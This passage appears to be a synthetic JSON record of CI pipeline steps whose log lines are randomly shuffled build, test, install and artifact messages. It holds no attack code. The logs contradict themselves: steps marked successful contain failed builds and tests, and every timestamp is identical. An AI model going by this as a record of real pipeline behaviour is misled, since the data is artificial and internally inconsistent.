          "Compiling src/service.java...",
          "Step 9/10: Building",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Compiling src/main.py...",
          "Cache hit for key-4444",
          "Installing prettier@5.3.0",
          "Exception: NullPointerException",
          "Step 7/10: Building",
          "Step 8/10: Building",
          "  PASS: test_auth_login (215ms)",
          "Installing prettier@3.9.0",
          "Installing axios@2.9.0",
          "Compiling src/main.py...",
          "Installing lodash@2.7.0",
          "  PASS: test_user_create (213ms)",
          "Installing axios@5.4.0",
          "  PASS: test_cache_hit (491ms)",
          "[12:00:25] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Cache hit for key-2213",
          "Compiling src/index.js...",
          "[12:00:25] ERROR: Connection failed",
          "Cache hit for key-2225",
          "Installing jest@2.18.0",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (39ms)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:00:25] INFO: Processing request",
          "Compiling src/main.py...",
          "Cache hit for key-3285",
          "Compiling src/index.js...",
          "[12:00:25] INFO: Processing request",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Compiling src/utils.go...",
          "Cache hit for key-1805",
          "[12:00:25] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (227ms)",
          "  PASS: test_db_connect (460ms)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_db_connect (358ms)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/app.ts...",
          "Installing jest@3.15.0",
          "Compiling src/index.js...",
          "Cache hit for key-4759",
          "Cache hit for key-9111",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_api_health (32ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Step 4/10: Building",
          "\u2713 test completed",
          "Step 4/10: Building",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 build completed",
          "\u2717 build failed with exit code 54",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Installing express@5.1.0",
          "[12:00:25] INFO: Processing request",
          "Installing lodash@5.5.0",
          "Cache hit for key-5613",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:00:25] INFO: Processing request",
          "Exception: TypeError",
          "  PASS: test_auth_login (264ms)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "Installing axios@1.6.0",
          "Installing prettier@2.17.0",
          "\u2713 test completed",
          "  PASS: test_user_create (322ms)",
          "Step 9/10: Building",
          "  PASS: test_auth_login (222ms)",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (230ms)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing lodash@3.14.0",
          "Installing lodash@4.9.0",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_api_health (155ms)",
          "Cache hit for key-6225",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:25] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-01T12:00:53.363112",
        "finished_at": "2025-12-01T12:01:16.353589",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (32MB)",
          "  PASS: test_db_connect (492ms)",
          "Cache hit for key-5512",
          "[12:00:25] WARN: Deprecated API usage",
          "Step 4/10: Building",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-7979",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_cache_hit (397ms)",
          "\u2713 lint completed",
          "[12:00:25] WARN: Deprecated API usage",
          "[12:00:25] INFO: Processing request",
          "Compiling src/app.ts...",
          "Installing express@5.0.0",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-6688",
          "  PASS: test_auth_login (30ms)",
          "  PASS: test_user_create (208ms)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2713 lint completed",
          "  PASS: test_db_connect (459ms)",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 3/10: Building",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Compiling src/utils.go...",
          "\u2717 build failed with exit code 103",
          "\u2713 test completed",
          "Step 4/10: Building",
          "Installing express@5.4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 test completed",
          "  PASS: test_api_health (68ms)",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-1249",
          "Step 1/10: Building",
          "  PASS: test_user_create (98ms)",
          "[12:00:25] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Cache hit for key-2424",
          "  PASS: test_api_health (256ms)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "\u2713 lint completed",
          "Installing prettier@3.0.0",
          "Compiling src/handler.rs...",
          "[12:00:25] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (241ms)",
          "\u2713 test completed",
          "\u2713 test completed",
          "Installing react@2.15.0",
          "Step 5/10: Building",
          "\u2713 build completed",
          "Installing lodash@2.3.0",
          "Step 9/10: Building",
          "[12:00:25] WARN: Deprecated API usage",
          "Installing prettier@1.2.0",
          "\u2713 build completed",
          "Installing express@2.20.0",
          "WARNING: react has known vulnerabilities",
          "Installing webpack@2.12.0",
          "Compiling src/index.js...",
          "[12:00:25] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Cache hit for key-2528",
          "Cache hit for key-4186",
          "  PASS: test_api_health (364ms)",
          "Compiling src/utils.go...",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "Step 1/10: Building",
          "Cache hit for key-9426",
          "Cache hit for key-8965",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Step 3/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_user_create (71ms)",
          "  PASS: test_db_connect (148ms)",
          "  PASS: test_api_health (295ms)",
          "Exception: RuntimeError",
          "Compiling src/service.java...",
          "Step 1/10: Building",
          "\u2717 build failed with exit code 103",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (179ms)",
          "\u2713 test completed",
          "Cache hit for key-8023",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Step 6/10: Building",
          "Cache hit for key-2383",
          "  PASS: test_auth_login (92ms)",
          "  PASS: test_user_create (457ms)",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "Installing webpack@2.18.0",
          "Compiling src/handler.rs...",
          "Step 3/10: Building",
          "\u2713 test completed",
          "  PASS: test_db_connect (403ms)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:25] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing express@2.18.0",
          "\u2713 build completed",
          "  PASS: test_api_health (402ms)",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Cache hit for key-7707",
          "\u2713 build completed",
          "Cache hit for key-6493",
          "Installing prettier@1.15.0",
          "\u2713 test completed",
          "  PASS: test_user_create (351ms)",
          "\u2713 build completed",
          "Step 2/10: Building",
          "Cache hit for key-3874",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Cache hit for key-2660",
          "Installing jest@4.0.0",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-5226",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Cache hit for key-9164",
          "[12:00:25] INFO: Processing request",
          "Step 10/10: Building",
          "Cache hit for key-6320",
          "Cache hit for key-4648",
          "Cache hit for key-8507",
          "[12:00:25] INFO: Processing request",
          "Compiling src/main.py...",
          "Installing lodash@5.0.0",
          "  PASS: test_db_connect (5ms)",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-8855",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Installing axios@4.4.0",
          "\u2713 test completed",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Installing lodash@2.11.0",
          "WARNING: axios has known vulnerabilities",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-4622",
          "Compiling src/index.js...",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Installing react@5.14.0",
          "[12:00:25] INFO: Processing request",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "  PASS: test_user_create (331ms)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "[12:00:25] INFO: Processing request",
          "Installing react@2.6.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "  PASS: test_db_connect (396ms)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-7875",
          "Artifact uploaded: build.tar.gz (27MB)",
          "  PASS: test_cache_hit (485ms)",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (298ms)",
          "Installing react@4.12.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:25] INFO: Processing request",
          "Step 7/10: Building",
          "Installing axios@1.5.0",
          "\u2713 test completed",
          "Step 4/10: Building",
          "Installing webpack@3.11.0",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Cache hit for key-9364",
          "Installing jest@2.9.0",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "[12:00:25] INFO: Processing request",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-01T12:01:16.353589",
        "finished_at": "2025-12-01T12:01:39.344066",
        "log_lines": [
          "=== Step: build ===",
          "Exception: RuntimeError",
          "Cache hit for key-9310",
          "Cache hit for key-4091",
          "  PASS: test_user_create (499ms)",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-8543",
          "  PASS: test_cache_hit (324ms)",
          "Cache hit for key-7827",
          "Artifact uploaded: build.tar.gz (36MB)",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Cache hit for key-1926",
          "Installing prettier@5.14.0",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "[12:00:25] INFO: Processing request",
          "Compiling src/utils.go...",
          "Cache hit for key-9526",
          "Step 7/10: Building",
          "[12:00:25] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:25] INFO: Processing request",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing axios@4.11.0",
          "  PASS: test_auth_login (178ms)",
          "Step 6/10: Building",
          "Compiling src/app.ts...",
          "Installing react@5.16.0",
          "  PASS: test_cache_hit (392ms)",
          "WARNING: prettier has known vulnerabilities",
          "Installing webpack@1.16.0",
          "Cache hit for key-6666",
          "Installing jest@3.5.0",
          "[12:00:25] INFO: Processing request",
          "Compiling src/utils.go...",
          "Installing lodash@4.8.0",
          "\u2713 test completed",
          "Step 1/10: Building",
          "  PASS: test_auth_login (372ms)",
          "Step 1/10: Building",
          "Cache hit for key-8352",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:25] INFO: Processing request",
          "Step 3/10: Building",
          "Installing express@4.19.0",
          "Installing eslint@4.15.0",
          "  PASS: test_db_connect (166ms)",
          "Installing eslint@3.16.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Step 7/10: Building",
          "  PASS: test_db_connect (411ms)",
          "Compiling src/handler.rs...",
          "[12:00:25] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Cache hit for key-9724",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-7366",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "  PASS: test_db_connect (426ms)",
          "\u2713 build completed",
          "Installing prettier@1.6.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Installing prettier@4.1.0",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "Installing jest@2.20.0",
          "Cache hit for key-8054",
          "FAILED: test_cache_hit",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 6/10: Building",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "Cache hit for key-1513",
          "  PASS: test_api_health (375ms)",
          "Cache hit for key-7893",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Installing react@3.8.0",
          "Installing eslint@1.17.0",
          "Cache hit for key-3180",
          "\u2713 test completed",
          "Step 10/10: Building",
          "Installing prettier@1.4.0",
          "[12:00:25] INFO: Processing request",
          "Step 1/10: Building",
          "\u2713 build completed",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "  PASS: test_db_connect (50ms)",
          "Compiling src/service.java...",
          "  PASS: test_api_health (13ms)",
          "[12:00:25] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-1764",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Cache hit for key-1691",
          "  PASS: test_api_health (384ms)",
          "Step 6/10: Building",
          "Step 8/10: Building",
          "Exception: NullPointerException",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "  PASS: test_db_connect (73ms)",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:00:25] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "[12:00:25] INFO: Processing request",
          "Installing webpack@3.4.0",
          "[12:00:25] INFO: Processing request",
          "Compiling src/service.java...",
          "Cache hit for key-4819",
          "Compiling src/app.ts...",
          "Step 10/10: Building",
          "Cache hit for key-5467",
          "Compiling src/main.py...",
          "Step 5/10: Building",
          "Cache hit for key-2837",
          "Installing lodash@2.0.0",
          "Step 7/10: Building",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "Installing webpack@4.4.0",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing axios@1.1.0",
          "Step 3/10: Building",
          "Installing jest@3.16.0",
          "Step 9/10: Building",
          "Compiling src/index.js...",
          "Installing eslint@1.14.0",
          "[12:00:25] WARN: Deprecated API usage",
          "Step 2/10: Building",
          "Compiling src/app.ts...",
          "Step 4/10: Building",
          "Compiling src/index.js...",
          "\u2717 build failed with exit code 91",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "  PASS: test_api_health (58ms)",
          "Cache hit for key-5440",
          "\u2713 lint completed",
          "  PASS: test_auth_login (453ms)",
          "Installing webpack@2.19.0",
          "\u2713 build completed",
          "Installing axios@4.14.0",
          "Compiling src/service.java...",
          "[12:00:25] INFO: Processing request",
          "Installing webpack@5.19.0",
          "Installing axios@4.9.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:00:25] WARN: Deprecated API usage",
          "[12:00:25] ERROR: Connection failed",
          "\u2713 lint completed",
          "Exception: RuntimeError",
          "Installing eslint@5.10.0",
          "\u2713 lint completed",
          "Installing react@2.10.0",
          "Step 4/10: Building",
          "\u2717 build failed with exit code 107",
          "[12:00:25] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-1714",
          "  PASS: test_api_health (494ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_auth_login (325ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/index.js...",
          "Installing webpack@5.6.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "Installing express@2.1.0",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Compiling src/index.js...",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-01T12:01:39.344066",
        "finished_at": "2025-12-01T12:01:47.007558",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Cache hit for key-3444",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_api_health (426ms)",
          "Step 6/10: Building",
          "  PASS: test_db_connect (269ms)",
          "Installing jest@5.11.0",
          "\u2713 test completed",
          "Cache hit for key-1883",
          "\u2713 lint completed",
          "Cache hit for key-8487",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Installing eslint@5.13.0",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Compiling src/app.ts...",
          "Installing express@5.13.0",
          "\u2713 test completed",
          "[12:00:25] INFO: Processing request",
          "Installing prettier@3.13.0",
          "Step 9/10: Building",
          "  PASS: test_cache_hit (92ms)",
          "Installing react@5.17.0",
          "Cache hit for key-4291",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Compiling src/app.ts...",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Step 2/10: Building",
          "Installing lodash@4.5.0",
          "  PASS: test_user_create (498ms)",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (189ms)",
          "Cache hit for key-7996",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (307ms)",
          "Step 9/10: Building",
          "\u2717 build failed with exit code 24",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: test_cache_hit (403ms)",
          "  PASS: test_auth_login (71ms)",
          "  PASS: test_db_connect (5ms)",
          "Cache hit for key-5897",
          "  PASS: test_auth_login (293ms)",
          "FAILED: test_api_health",
          "[12:00:25] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "FAILED: test_db_connect",
          "Installing jest@4.10.0",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (335ms)",
          "Step 1/10: Building",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "Cache hit for key-2867",
          "Installing webpack@1.11.0",
          "Step 8/10: Building",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Cache hit for key-2126",
          "\u2717 build failed with exit code 59",
          "Cache hit for key-9998",
          "Exception: TypeError",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "Installing webpack@1.5.0",
          "[12:00:25] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing jest@1.19.0",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Step 7/10: Building",
          "Installing lodash@3.5.0",
          "Exception: NullPointerException",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "\u2713 test completed",
          "Installing jest@2.3.0",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Installing eslint@2.6.0",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (170ms)",
          "  PASS: test_api_health (65ms)",
          "Installing webpack@2.4.0",
          "  PASS: test_auth_login (319ms)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "[12:00:25] INFO: Processing request",
          "FAILED: test_cache_hit",
          "\u2713 lint completed",
          "Cache hit for key-4215",
          "  PASS: test_cache_hit (324ms)",
          "Step 9/10: Building",
          "[12:00:25] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Installing axios@5.10.0",
          "\u2713 lint completed",
          "\u2717 build failed with exit code 57",
          "Installing react@2.7.0",
          "[12:00:25] ERROR: Connection failed",
          "  PASS: test_cache_hit (228ms)",
          "Cache hit for key-3726",
          "Step 7/10: Building",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "  PASS: test_user_create (172ms)",
          "Cache hit for key-3163",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Step 4/10: Building",
          "Cache hit for key-1406",
          "[12:00:25] ERROR: Connection failed",
          "[12:00:25] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (234ms)",
          "Step 3/10: Building",
          "Step 2/10: Building",
          "  PASS: test_auth_login (18ms)",
          "\u2713 test completed",
          "Cache hit for key-9067",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (31MB)",
          "\u2713 test completed",
          "Cache hit for key-7045",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "  PASS: test_db_connect (342ms)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "WARNING: express has known vulnerabilities",
          "Step 3/10: Building",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-8504",
          "Step 7/10: Building",
          "WARNING: react has known vulnerabilities",
          "Cache hit for key-1418",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-3039",
          "Installing webpack@4.10.0",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-1692",
          "Exception: ValueError",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u2713 test completed",
          "Installing react@3.17.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache hit for key-5437",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-3254",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (349ms)",
          "Cache hit for key-1698",
          "Cache hit for key-9812",
          "  PASS: test_auth_login (270ms)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:25] WARN: Deprecated API usage",
          "Installing express@2.12.0",
          "Installing lodash@2.5.0",
          "Step 8/10: Building",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (40MB)",
          "[12:00:25] INFO: Processing request",
          "Installing express@2.12.0",
          "Installing react@1.14.0",
          "Step 2/10: Building",
          "Cache hit for key-2746",
          "Cache hit for key-1199",
          "  PASS: test_user_create (282ms)",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Compiling src/main.py...",
          "Installing jest@3.4.0",
          "Compiling src/service.java...",
          "Step 3/10: Building",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "FAILED: test_auth_login",
          "Compiling src/service.java...",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-01T12:01:47.007558",
        "finished_at": "2025-12-01T12:02:09.998035",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Installing webpack@2.7.0",
          "Installing prettier@5.5.0",
          "Compiling src/index.js...",
          "Step 5/10: Building",
          "[12:00:25] INFO: Processing request",
          "Step 4/10: Building",
          "Installing express@4.9.0",
          "Step 10/10: Building",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Step 8/10: Building",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-3679",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "WARNING: jest has known vulnerabilities",
          "\u2713 test completed",
          "Step 8/10: Building",
          "Step 6/10: Building",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:25] ERROR: Connection failed",
          "Compiling src/app.ts...",
          "\u2717 build failed with exit code 10",
          "Artifact uploaded: build.tar.gz (23MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Compiling src/utils.go...",
          "Installing react@4.17.0",
          "\u2713 lint completed",
          "  PASS: test_db_connect (448ms)",
          "[12:00:25] INFO: Processing request",
          "\u2713 test completed",
          "Installing prettier@5.9.0",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "[12:00:25] INFO: Processing request",
          "Installing axios@4.2.0",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Compiling src/app.ts...",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (44MB)",
          "[12:00:25] INFO: Processing request",
          "Step 9/10: Building",
          "Installing react@4.0.0",
          "  PASS: test_auth_login (219ms)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "\u2713 build completed",
          "Cache hit for key-2350",
          "\u2713 test completed",
          "  PASS: test_cache_hit (311ms)",
          "Installing jest@5.9.0",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Cache hit for key-7590",
          "Step 8/10: Building",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Cache hit for key-2452",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Exception: ValueError",
          "Cache hit for key-8688",
          "  PASS: test_api_health (464ms)",
          "Cache hit for key-9820",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Cache hit for key-4585",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:00:25] WARN: Deprecated API usage",
          "Step 6/10: Building",
          "[12:00:25] INFO: Processing request",
          "Installing lodash@4.10.0",
          "\u2713 test completed",
          "Step 9/10: Building",
          "  PASS: test_auth_login (291ms)",
          "Cache hit for key-4342",
          "Cache hit for key-1741",
          "Step 3/10: Building",
          "  PASS: test_api_health (236ms)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: test_user_create (204ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_db_connect (382ms)",
          "  PASS: test_auth_login (332ms)",
          "WARNING: express has known vulnerabilities",
          "Step 9/10: Building",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "[12:00:25] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Compiling src/index.js...",
          "[12:00:25] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "  PASS: test_cache_hit (155ms)",
          "Step 8/10: Building",
          "Step 4/10: Building",
          "Step 1/10: Building",
          "Cache hit for key-4727",
          "\u2713 lint completed",
          "  PASS: test_user_create (410ms)",
          "Compiling src/index.js...",
          "Compiling src/index.js...",
          "Compiling src/index.js...",
          "Installing axios@3.17.0",
          "Step 7/10: Building",
          "[12:00:25] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "Installing webpack@4.15.0",
          "\u2713 test completed",
          "Cache hit for key-5470",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:25] INFO: Processing request",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
